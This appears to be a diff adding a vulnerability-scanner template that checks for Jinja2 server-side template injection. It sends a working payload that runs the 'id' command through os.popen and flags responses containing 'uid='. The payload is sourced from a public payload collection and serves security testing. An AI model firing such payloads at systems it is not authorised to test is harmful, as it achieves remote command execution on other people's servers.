@@ -1,0 +1,23 @@
+id: patt-ssti-jinja2-rce-01-template
+name: 'PATT ssti patt-ssti-jinja2-rce-01 via template'
+severity: critical
+type: active
+tags:
+  - ssti
+  - patt
+requires:
+  - python
+  - django
+description: 'PATT Jinja2 Rendered RCE via os.popen(id). [patt:patt-ssti-jinja2-rce-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Python.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      template:
+        - '{{ self.__init__.__globals__.__builtins__.__import__(''os'').popen(''id'').read() }}'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
+          - 'gid='
